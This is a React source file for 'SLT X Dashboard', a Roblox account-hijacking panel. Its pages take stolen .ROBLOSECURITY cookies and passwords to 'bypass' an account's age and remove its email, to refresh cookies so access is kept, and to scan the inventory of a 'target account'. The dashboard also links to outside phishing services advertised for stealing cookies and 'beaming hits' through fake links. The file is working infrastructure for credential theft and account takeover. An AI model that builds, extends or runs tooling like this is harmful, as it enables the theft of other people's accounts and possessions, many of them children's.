import React, { useState, useEffect } from 'react';
import {
  HashRouter as Router,
  Routes,
  Route,
  Link,
  useNavigate,
  useLocation,
  Navigate
} from 'react-router-dom';
import {
  LayoutDashboard,
  ShieldCheck,
  RefreshCw,
  UserSearch,
  BookOpen,
  Lock,
  MessageSquare,
  Activity,
  Globe,
  Link as LinkIcon,
  ChevronRight,
  X,
  Menu,
  CheckCircle2,
  XCircle,
  Eye,
  EyeOff,
  Copy,
  ChevronDown,
  ChevronUp,
  Loader2
} from 'lucide-react';

// --- Components ---

function ResponseDisplay({ 
  status, 
  title, 
  message, 
  details, 
  content, 
  onCopyContent, 
  copied 
}: { 
  status: 'success' | 'error' | 'loading' | null, 
  title?: string, 
  message?: string, 
  details?: any, 
  content?: string, 
  onCopyContent?: () => void, 
  copied?: boolean 
}) {
  const [isExpanded, setIsExpanded] = useState(false);

  if (!status) return null;

  if (status === 'loading') {
    return (
      <div className="mt-8 p-8 border border-[#1f1f1f] bg-[#0a0a0a] rounded-3xl flex flex-col items-center justify-center gap-4 animate-pulse">
        <Loader2 size={32} className="animate-spin text-white" />
        <p className="text-gray-400 font-medium">Processing request...</p>
      </div>
    );
  }

  const isSuccess = status === 'success';

  return (
    <div className={`mt-8 overflow-hidden rounded-3xl border transition-all duration-300 ${
      isSuccess 
        ? 'bg-green-500/5 border-green-500/20' 
        : 'bg-red-500/5 border-red-500/20'
    }`}>
      <div className="p-6 flex gap-5 items-start">
        <div className={`shrink-0 p-3 rounded-2xl ${isSuccess ? 'bg-green-500/10 text-green-500' : 'bg-red-500/10 text-red-500'}`}>
          {isSuccess ? <CheckCircle2 size={28} /> : <XCircle size={28} />}
        </div>
        <div className="flex-1 min-w-0">
          <h4 className={`font-bold text-xl mb-1 ${isSuccess ? 'text-green-400' : 'text-red-400'}`}>
            {title || (isSuccess ? 'Operation Successful' : 'Operation Failed')}
          </h4>
          <p className="text-gray-400 text-sm leading-relaxed">
            {message}
          </p>
          
          {content && (
            <div className="mt-6">
              <div className="flex items-center justify-between mb-2">
                <label className="text-[10px] font-bold uppercase tracking-wider text-gray-500">Result Content</label>
                {onCopyContent && (
                  <button 
                    onClick={onCopyContent}
                    className="flex items-center gap-1.5 text-[10px] font-bold uppercase tracking-wider text-gray-400 hover:text-white transition-colors"
                  >
                    {copied ? <><CheckCircle2 size={12} className="text-green-500" /> Copied</> : <><Copy size={12} /> Copy Result</>}
                  </button>
                )}
              </div>
              <div className="relative group">
                <div className="w-full bg-[#050505] border border-white/5 rounded-2xl p-4 text-xs font-mono text-gray-300 break-all max-h-40 overflow-y-auto whitespace-pre-wrap">
                  {content}
                </div>
              </div>
            </div>
          )}

          {details && (
            <div className="mt-4">
              <button 
                onClick={() => setIsExpanded(!isExpanded)}
                className="flex items-center gap-2 text-xs font-bold text-gray-500 hover:text-gray-300 transition-colors"
              >
                {isExpanded ? <ChevronUp size={14} /> : <ChevronDown size={14} />}
                {isExpanded ? 'Hide Details' : 'View Technical Details'}
              </button>
              
              {isExpanded && (
                <div className="mt-3 p-4 bg-black/40 rounded-2xl border border-white/5 overflow-x-auto">
                  <pre className="text-[10px] font-mono text-gray-500 leading-tight">
                    {JSON.stringify(details, null, 2)}
                  </pre>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function Layout({ children, sidebarOpen, setSidebarOpen, isMobile }: any) {
  const location = useLocation();

  const activeTab = () => {
    const path = location.pathname;
    if (path === '/') return 'Dashboard';
    if (path === '/bypass') return 'Bypasser';
    if (path === '/refresh') return 'Refresher';
    if (path === '/checker') return 'Account Checker';
    if (path === '/tutorials') return 'Tutorials';
    if (path === '/admin') return 'Admin Panel';
    return '';
  };

  return (
    <div className="flex h-screen bg-[#0a0a0a] text-white font-sans overflow-hidden">
      
      {/* Mobile Overlay */}
      {isMobile && sidebarOpen && (
        <div 
          className="fixed inset-0 bg-black/60 z-40 transition-opacity"
          onClick={() => setSidebarOpen(false)}
        />
      )}

      {/* Sidebar */}
      <aside 
        className={`
          ${isMobile 
            ? `fixed inset-y-0 left-0 z-50 w-64 transform transition-transform duration-300 ease-in-out ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'}`
            : `relative z-20 flex flex-col transition-all duration-300 ease-in-out ${sidebarOpen ? 'w-64' : 'w-0'}`
          }
          border-r border-[#1f1f1f] bg-[#0a0a0a]
        `}
      >
        <div className="p-6 flex items-center justify-between overflow-hidden whitespace-nowrap h-[80px]">
           <div className="text-2xl font-bold italic tracking-wider">SLT X Dashboard</div>
           {isMobile && (
             <button onClick={() => setSidebarOpen(false)} className="text-gray-400 hover:text-white">
               <X size={20} />
             </button>
           )}
        </div>

        <nav className="flex-1 px-4 space-y-1 overflow-y-auto overflow-x-hidden whitespace-nowrap pb-4">
          <NavItem to="/" icon={<LayoutDashboard size={20} />} label="Dashboard" active={activeTab() === 'Dashboard'} onClick={() => isMobile && setSidebarOpen(false)} />
          <NavItem to="/bypass" icon={<ShieldCheck size={20} />} label="Bypasser" active={activeTab() === 'Bypasser'} onClick={() => isMobile && setSidebarOpen(false)} />
          <NavItem to="/refresh" icon={<RefreshCw size={20} />} label="Refresher" active={activeTab() === 'Refresher'} onClick={() => isMobile && setSidebarOpen(false)} />
          <NavItem to="/checker" icon={<UserSearch size={20} />} label="Account Checker" active={activeTab() === 'Account Checker'} onClick={() => isMobile && setSidebarOpen(false)} />
          <NavItem to="/tutorials" icon={<BookOpen size={20} />} label="Tutorials" active={activeTab() === 'Tutorials'} onClick={() => isMobile && setSidebarOpen(false)} />

          <div className="my-4 border-t border-[#1f1f1f]"></div>

          <NavItem to="/admin" icon={<Lock size={20} />} label="Admin Panel" active={activeTab() === 'Admin Panel'} onClick={() => isMobile && setSidebarOpen(false)} />
          <NavItem to="#" icon={<MessageSquare size={20} />} label="Discord Community" active={false} onClick={() => { window.open('https://discord.gg/qZePjjmb7k', '_blank'); if (isMobile) setSidebarOpen(false); }} />
        </nav>

        {/* Desktop Collapse button */}
        {!isMobile && (
          <button 
            onClick={() => setSidebarOpen(!sidebarOpen)}
            className="absolute -right-3 top-1/2 transform -translate-y-1/2 bg-[#1f1f1f] border border-[#2a2a2a] rounded-2xl p-1 text-gray-400 hover:text-white z-30"
          >
            {sidebarOpen ? <X size={14} /> : <Menu size={14} />}
          </button>
        )}
      </aside>

      {/* Main Content */}
      <main className="flex-1 flex flex-col h-screen overflow-hidden relative z-10 w-full">
        
        {/* Mobile Header */}
        {isMobile && (
          <div className="flex items-center justify-between p-4 border-b border-[#1f1f1f] bg-[#0a0a0a] shrink-0 h-[80px]">
            <div className="text-xl font-bold italic tracking-wider">SLT X</div>
            <button onClick={() => setSidebarOpen(true)} className="text-gray-400 hover:text-white p-2 -mr-2">
              <Menu size={24} />
            </button>
          </div>
        )}

        <div className="flex-1 overflow-y-auto p-4 sm:p-6 md:p-8 lg:p-12">
          {children}
        </div>
      </main>
    </div>
  );
}

function NavItem({ to, icon, label, active = false, onClick }: { to: string, icon: React.ReactNode, label: string, active?: boolean, onClick?: () => void }) {
  if (to === '#') {
    return (
      <button
        onClick={onClick}
        className={`w-full flex items-center gap-3 px-4 py-3 rounded-2xl transition-colors ${
          active ? 'bg-[#1f1f1f] text-white' : 'text-gray-400 hover:text-white hover:bg-[#141414]'
        }`}
      >
        {icon}
        <span className="font-medium text-sm">{label}</span>
      </button>
    );
  }
  
  return (
    <Link
      to={to}
      onClick={onClick}
      className={`w-full flex items-center gap-3 px-4 py-3 rounded-2xl transition-colors ${
        active ? 'bg-[#1f1f1f] text-white' : 'text-gray-400 hover:text-white hover:bg-[#141414]'
      }`}
    >
      {icon}
      <span className="font-medium text-sm">{label}</span>
    </Link>
  );
}

function StatItem({ icon, label, value }: { icon: React.ReactNode, label: string, value: string }) {
  return (
    <div className="p-5 md:p-6 border border-[#1f1f1f] rounded-2xl bg-[#0a0a0a] flex flex-col">
      <div className="text-gray-400 mb-3 md:mb-4">
        <div className="p-2 border border-[#1f1f1f] inline-block rounded-2xl bg-[#0a0a0a]">
            {icon}
        </div>
      </div>
      <div>
        <p className="text-gray-400 text-xs md:text-sm mb-1">{label}</p>
        <p className="text-xl md:text-2xl font-bold">{value}</p>
      </div>
    </div>
  );
}

function ToolCard({ icon, title, subtitle, description, children, onClick }: { icon: React.ReactNode, title: string, subtitle: string, description: string, children?: React.ReactNode, onClick?: () => void }) {
  return (
    <div className="border border-[#1f1f1f] bg-[#0a0a0a] p-5 md:p-6 flex flex-col h-full min-h-[220px] md:min-h-[250px] rounded-2xl">
      <div className="flex justify-between items-start mb-4">
        <div className="flex items-center gap-3">
          <div className="p-2 border border-[#1f1f1f] rounded-2xl text-gray-300 bg-[#0a0a0a]">
            {icon}
          </div>
          <div>
            <h3 className="font-bold text-base md:text-lg leading-tight">{title}</h3>
            <p className="text-[9px] md:text-[10px] text-gray-400 tracking-wider font-semibold uppercase">{subtitle}</p>
          </div>
        </div>
        <div className="flex items-center gap-1.5 bg-[#141414] px-2 py-1 rounded-2xl border border-[#1f1f1f] shrink-0 ml-2">
          <div className="w-1.5 h-1.5 bg-white rounded-2xl"></div>
          <span className="text-[8px] md:text-[9px] font-bold tracking-wider text-white">ONLINE</span>
        </div>
      </div>
      
      <p className="text-gray-400 text-xs md:text-sm mb-6 flex-1 leading-relaxed">
        {description}
      </p>

      <div className="mt-auto flex flex-col gap-3">
        {children}
        {onClick && (
          <button 
            onClick={onClick}
            className="w-full bg-white text-black font-bold py-2 md:py-2.5 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors text-sm md:text-base"
          >
            Launch Session <ChevronRight size={16} />
          </button>
        )}
      </div>
    </div>
  );
}

function TutorialCard({ id, icon, title, subtitle, colorClass, iconBgClass, isExpanded, onClick, children }: any) {
  return (
    <div className={`rounded-3xl border overflow-hidden transition-all duration-200 ${colorClass}`}>
      <button 
        onClick={onClick}
        className="w-full flex items-center justify-between p-4 md:p-5 text-left"
      >
        <div className="flex items-center gap-4">
          <div className={`p-3 rounded-2xl ${iconBgClass}`}>
            {icon}
          </div>
          <div>
            <h3 className="font-bold text-white text-base md:text-lg">{title}</h3>
            <p className="text-xs md:text-sm text-gray-400 mt-0.5">{subtitle}</p>
          </div>
        </div>
        <div className="text-gray-500 pr-2">
          {isExpanded ? <ChevronUp size={20} /> : <ChevronDown size={20} />}
        </div>
      </button>
      
      {isExpanded && (
        <div className="px-5 pb-5 pt-2 border-t border-white/5">
          {children}
        </div>
      )}
    </div>
  );
}

// --- Pages ---

function Dashboard({ backendStats }: any) {
  const navigate = useNavigate();
  
  return (
    <>
      <header className="mb-6 md:mb-8">
        <h1 className="text-2xl md:text-3xl font-bold mb-1">Dashboard</h1>
        <p className="text-gray-400 text-sm">SLT X Dashboard</p>
      </header>

      {/* Stats Row */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 mb-6 md:mb-8">
        <StatItem 
          icon={<Activity size={20} />} 
          label="Total Bypasses" 
          value={backendStats.totalBypasses.toString()} 
        />
        <StatItem 
          icon={<UserSearch size={20} />} 
          label="Accounts Checked" 
          value={backendStats.totalChecks.toString()} 
        />
        <StatItem 
          icon={<RefreshCw size={20} />} 
          label="Cookies Refreshed" 
          value={backendStats.totalRefreshes.toString()} 
        />
      </div>

      {/* Tools Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4 md:gap-6">
        <ToolCard
          icon={<ShieldCheck size={24} />}
          title="Bypasser"
          subtitle="ROBLOX BYPASSER"
          description="a roblox bypasser Forces Roblox accounts age from 13+ to 13- which removes the email."
          onClick={() => navigate('/bypass')}
        />

        <ToolCard
          icon={<RefreshCw size={24} />}
          title="Refresher"
          subtitle="COOKIE REFRESHER"
          description="Refresh Roblox account cookies to maintain access."
          onClick={() => navigate('/refresh')}
        />

        <ToolCard
          icon={<UserSearch size={24} />}
          title="Account Checker"
          subtitle="DEEP SCANNER"
          description="account checker is that checks your whole inventory just using cookie"
          onClick={() => navigate('/checker')}
        />

        <ToolCard
          icon={<Activity size={24} />}
          title="Autohar"
          subtitle="AUTOMATED HAR"
          description="a autohar is a fake Roblox tools they can steal your Roblox cookie."
          onClick={() => window.open('https://bloxtools.net/page/login/21c86853', '_blank')}
        />

        <ToolCard
          icon={<Globe size={24} />}
          title="Generator"
          subtitle="LINK GENERATOR"
          description="creating fake links to get hits/beaming hits"
        >
          <div className="flex flex-col gap-2">
            <button 
              onClick={() => window.open('https://www.logged.tg/auth/klux4', '_blank')}
              className="w-full bg-white text-black font-bold py-2 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors text-sm"
            >
              Main Site <Globe size={14} />
            </button>
            <button 
              onClick={() => window.open('https://app.beamse.pro/gen/esp', '_blank')}
              className="w-full bg-[#141414] border border-[#1f1f1f] text-white font-bold py-2 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-[#1f1f1f] transition-colors text-sm"
            >
              Backup Site <RefreshCw size={14} />
            </button>
          </div>
        </ToolCard>

        <ToolCard
          icon={<LinkIcon size={24} />}
          title="Hyperlink"
          subtitle="EXTERNAL TOOL"
          description="Access the advanced Hyperlink session manager for enhanced connectivity and control."
          onClick={() => window.open('https://silentx-hyperlink.vercel.app/', '_blank')}
        />
      </div>
    </>
  );
}

function Bypasser({ setBackendStats }: any) {
  const [cookie, setCookie] = useState('');
  const [password, setPassword] = useState('');
  const [status, setStatus] = useState<'success' | 'error' | 'loading' | null>(null);
  const [response, setResponse] = useState<any>(null);
  const [copied, setCopied] = useState(false);

  const handleBypass = async () => {
    if (!cookie || !password) {
      setStatus('error');
      setResponse({ message: 'Please provide both cookie and password.' });
      return;
    }
    setStatus('loading');
    setCopied(false);
    try {
      const res = await fetch('/api/bypass', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, password })
      });
      const data = await res.json();
      if (res.ok) {
        setStatus('success');
        setResponse(data);
        setBackendStats((prev: any) => ({ ...prev, totalBypasses: prev.totalBypasses + 1 }));
      } else {
        setStatus('error');
        setResponse(data);
      }
    } catch (error: any) {
      setStatus('error');
      setResponse({ message: error.message || 'An error occurred' });
    }
  };

  const copyContent = () => {
    if (response) {
      navigator.clipboard.writeText(JSON.stringify(response, null, 2));
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  return (
    <div className="max-w-4xl mx-auto">
      <header className="mb-8">
        <h1 className="text-2xl md:text-3xl font-bold mb-2">Bypasser</h1>
        <p className="text-gray-400 text-sm">Forces Roblox accounts age from 13+ to 13- which removes the email.</p>
      </header>

      <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-6 md:p-8">
        <div className="space-y-6">
          <div>
            <label className="block text-sm font-bold text-gray-400 mb-2 uppercase tracking-wider">Roblox Cookie</label>
            <input 
              type="text" 
              value={cookie}
              onChange={(e) => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-white/20 transition-colors"
            />
          </div>
          <div>
            <label className="block text-sm font-bold text-gray-400 mb-2 uppercase tracking-wider">Password</label>
            <input 
              type="password" 
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter password"
              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-white/20 transition-colors"
            />
          </div>
          <button 
            onClick={handleBypass}
            disabled={status === 'loading'}
            className="w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {status === 'loading' ? 'Processing...' : 'Execute Bypass'} <ChevronRight size={18} />
          </button>
        </div>
      </div>

      <ResponseDisplay 
        status={status} 
        title={status === 'success' ? 'Bypass Successful' : 'Bypass Failed'}
        message={response?.message || response?.error}
        details={response}
        content={response ? JSON.stringify(response, null, 2) : undefined}
        onCopyContent={copyContent}
        copied={copied}
      />
    </div>
  );
}

function Refresher({ setBackendStats }: any) {
  const [cookie, setCookie] = useState('');
  const [status, setStatus] = useState<'success' | 'error' | 'loading' | null>(null);
  const [response, setResponse] = useState<any>(null);
  const [copied, setCopied] = useState(false);

  const handleRefresh = async () => {
    if (!cookie) {
      setStatus('error');
      setResponse({ message: 'Please provide a cookie.' });
      return;
    }
    setStatus('loading');
    setCopied(false);
    try {
      const res = await fetch('/api/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie })
      });
      const data = await res.json();
      if (res.ok) {
        setStatus('success');
        setResponse(data);
        setBackendStats((prev: any) => ({ ...prev, totalRefreshes: prev.totalRefreshes + 1 }));
      } else {
        setStatus('error');
        setResponse(data);
      }
    } catch (error: any) {
      setStatus('error');
      setResponse({ message: error.message || 'An error occurred' });
    }
  };

  const copyContent = () => {
    if (response?.result?.content) {
      navigator.clipboard.writeText(response.result.content);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  return (
    <div className="max-w-4xl mx-auto">
      <header className="mb-8">
        <h1 className="text-2xl md:text-3xl font-bold mb-2">Refresher</h1>
        <p className="text-gray-400 text-sm">Refresh Roblox account cookies to maintain access.</p>
      </header>

      <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-6 md:p-8">
        <div className="space-y-6">
          <div>
            <label className="block text-sm font-bold text-gray-400 mb-2 uppercase tracking-wider">Roblox Cookie</label>
            <input 
              type="text" 
              value={cookie}
              onChange={(e) => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-white/20 transition-colors"
            />
          </div>
          <button 
            onClick={handleRefresh}
            disabled={status === 'loading'}
            className="w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {status === 'loading' ? 'Processing...' : 'Execute Refresh'} <ChevronRight size={18} />
          </button>
        </div>
      </div>

      <ResponseDisplay 
        status={status} 
        title={status === 'success' ? 'Refresh Successful' : 'Refresh Failed'}
        message={response?.message || response?.error || response?.result?.message}
        details={response}
        content={response?.result?.content}
        onCopyContent={copyContent}
        copied={copied}
      />
    </div>
  );
}

function AccountChecker({ setBackendStats }: any) {
  const [cookie, setCookie] = useState('');
  const [status, setStatus] = useState<'success' | 'error' | 'loading' | null>(null);
  const [response, setResponse] = useState<any>(null);
  const [copied, setCopied] = useState(false);

  const handleCheck = async () => {
    if (!cookie) {
      setStatus('error');
      setResponse({ message: 'Please provide a cookie.' });
      return;
    }
    setStatus('loading');
    setCopied(false);
    try {
      const res = await fetch('/api/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie })
      });
      const data = await res.json();
      if (res.ok) {
        setStatus('success');
        setResponse(data);
        setBackendStats((prev: any) => ({ ...prev, totalChecks: prev.totalChecks + 1 }));
      } else {
        setStatus('error');
        setResponse(data);
      }
    } catch (error: any) {
      setStatus('error');
      setResponse({ message: error.message || 'An error occurred' });
    }
  };

  const copyContent = () => {
    if (response) {
      navigator.clipboard.writeText(JSON.stringify(response, null, 2));
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  return (
    <div className="max-w-4xl mx-auto">
      <header className="mb-8">
        <h1 className="text-2xl md:text-3xl font-bold mb-2">Account Checker</h1>
        <p className="text-gray-400 text-sm">Deep scanner that checks your whole inventory just using cookie.</p>
      </header>

      <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-6 md:p-8">
        <div className="space-y-6">
          <div>
            <label className="block text-sm font-bold text-gray-400 mb-2 uppercase tracking-wider">Roblox Cookie</label>
            <input 
              type="text" 
              value={cookie}
              onChange={(e) => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-white/20 transition-colors"
            />
          </div>
          <button 
            onClick={handleCheck}
            disabled={status === 'loading'}
            className="w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {status === 'loading' ? 'Processing...' : 'Execute Scan'} <ChevronRight size={18} />
          </button>
        </div>
      </div>

      <ResponseDisplay 
        status={status} 
        title={status === 'success' ? 'Scan Complete' : 'Scan Failed'}
        message={response?.message || response?.error || (response?.result?.status === 'error' ? response.result.message : undefined)}
        details={response}
        content={response ? JSON.stringify(response, null, 2) : undefined}
        onCopyContent={copyContent}
        copied={copied}
      />
    </div>
  );
}

function Tutorials() {
  const [expandedTutorial, setExpandedTutorial] = useState<string | null>(null);

  const toggleTutorial = (id: string) => {
    if (expandedTutorial === id) {
      setExpandedTutorial(null);
    } else {
      setExpandedTutorial(id);
    }
  };

  return (
    <div className="max-w-3xl mx-auto">
      <header className="mb-8">
        <h1 className="text-2xl md:text-3xl font-bold mb-2">How to use SLT X tools</h1>
        <p className="text-gray-400 text-sm">Step-by-step guides for every tool in the suite. Click a card to expand the tutorial.</p>
      </header>

      <div className="space-y-4">
        <TutorialCard
          id="bypasser"
          icon={<ShieldCheck size={20} className="text-blue-400" />}
          title="Bypasser Module"
          subtitle="How to submit your Roblox cookie for bypassing"
          colorClass="bg-[#0f172a] border-blue-900/30"
          iconBgClass="bg-blue-900/20"
          isExpanded={expandedTutorial === 'bypasser'}
          onClick={() => toggleTutorial('bypasser')}
        >
          <p className="text-sm text-gray-300">1. Get your Roblox cookie (.ROBLOSECURITY).<br/>2. Paste it into the Bypasser input field.<br/>3. Click "Execute Bypass".</p>
        </TutorialCard>

        <TutorialCard
          id="refresher"
          icon={<RefreshCw size={20} className="text-green-400" />}
          title="Refresher Suite"
          subtitle="How to refresh a Roblox cookie"
          colorClass="bg-[#052e16] border-green-900/30"
          iconBgClass="bg-green-900/20"
          isExpanded={expandedTutorial === 'refresher'}
          onClick={() => toggleTutorial('refresher')}
        >
          <p className="text-sm text-gray-300">1. Paste your valid Roblox cookie.<br/>2. Click "Execute Refresh".<br/>3. Copy the new cookie provided.</p>
        </TutorialCard>

        <TutorialCard
          id="checker"
          icon={<UserSearch size={20} className="text-purple-400" />}
          title="Account Checker"
          subtitle="How to check Roblox account details"
          colorClass="bg-[#2e1065] border-purple-900/30"
          iconBgClass="bg-purple-900/20"
          isExpanded={expandedTutorial === 'checker'}
          onClick={() => toggleTutorial('checker')}
        >
          <p className="text-sm text-gray-300">1. Enter the target account cookie.<br/>2. Click "Execute Scan".<br/>3. View the account details in the results panel.</p>
        </TutorialCard>
      </div>
    </div>
  );
}

function AppContent({ sidebarOpen, setSidebarOpen, isMobile, backendStats, setBackendStats }: any) {
  const location = useLocation();

  return (
    <Layout 
      sidebarOpen={sidebarOpen} 
      setSidebarOpen={setSidebarOpen} 
      isMobile={isMobile} 
    >
      <Routes>
        <Route path="/" element={<PageWrapper><Dashboard backendStats={backendStats} /></PageWrapper>} />
        <Route path="/bypass" element={<PageWrapper><Bypasser setBackendStats={setBackendStats} /></PageWrapper>} />
        <Route path="/refresh" element={<PageWrapper><Refresher setBackendStats={setBackendStats} /></PageWrapper>} />
        <Route path="/checker" element={<PageWrapper><AccountChecker setBackendStats={setBackendStats} /></PageWrapper>} />
        <Route path="/tutorials" element={<PageWrapper><Tutorials /></PageWrapper>} />
        <Route path="/admin" element={
          <PageWrapper>
            <div className="flex flex-col items-center justify-center h-64 text-gray-400">
              <Lock size={48} className="text-gray-600 mb-4" />
              <p className="text-lg font-medium mb-2">Admin Panel Module</p>
              <p className="text-sm">This section is currently under development.</p>
            </div>
          </PageWrapper>
        } />
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Layout>
  );
}

export default function App() {
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [isMobile, setIsMobile] = useState(false);
  const [backendStats, setBackendStats] = useState({
    totalBypasses: 0,
    totalChecks: 0,
    totalRefreshes: 0,
    lastRefreshTime: null as string | null
  });

  useEffect(() => {
    const fetchStats = async () => {
      try {
        const res = await fetch('/api/stats');
        if (res.ok) {
          const data = await res.json();
          setBackendStats(data);
        }
      } catch (error) {
        console.error("Failed to fetch stats:", error);
      }
    };

    fetchStats();
    const interval = setInterval(fetchStats, 30000); // Refresh stats every 30s
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const handleResize = () => {
      const mobile = window.innerWidth < 768;
      setIsMobile(mobile);
      if (mobile) {
        setSidebarOpen(false);
      } else {
        setSidebarOpen(true);
      }
    };
    
    handleResize();
    window.addEventListener('resize', handleResize);
    return () => {
      window.removeEventListener('resize', handleResize);
    };
  }, []);

  return (
    <Router>
      <AppContent 
        sidebarOpen={sidebarOpen} 
        setSidebarOpen={setSidebarOpen} 
        isMobile={isMobile} 
        backendStats={backendStats}
        setBackendStats={setBackendStats}
      />
    </Router>
  );
}

function PageWrapper({ children }: { children: React.ReactNode }) {
  return (
    <div className="animate-in fade-in slide-in-from-bottom-4 duration-500">
      {children}
    </div>
  );
}
